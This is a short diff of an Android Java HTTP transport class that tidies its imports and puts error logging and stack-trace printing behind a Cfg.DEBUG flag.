@@ -19,17 +19,13 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.conn.ConnectionKeepAliveStrategy;
 import org.apache.http.cookie.Cookie;
 import org.apache.http.entity.ByteArrayEntity;
-import org.apache.http.impl.client.DefaultConnectionKeepAliveStrategy;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.params.BasicHttpParams;
-import org.apache.http.params.HttpConnectionParams;
 import org.apache.http.params.HttpParams;
 
 import android.util.Log;
 
-import com.android.service.Debug;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -166,14 +162,14 @@ public abstract class HttpTransport extends Transport {
 				return null;
 			}
 		} catch (final Exception ex) {
-			Log.d("QZ", TAG + " Error: " + ex.toString());
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + ex.toString());
 			throw new TransportException(1);
 		} finally {
 			if (in != null) {
 				try {
 					in.close();
 				} catch (final IOException e) {
-					if(AutoConfig.DEBUG) { e.printStackTrace(); }
+					if(Cfg.DEBUG) { e.printStackTrace(); }
 				}
 			}
 		}
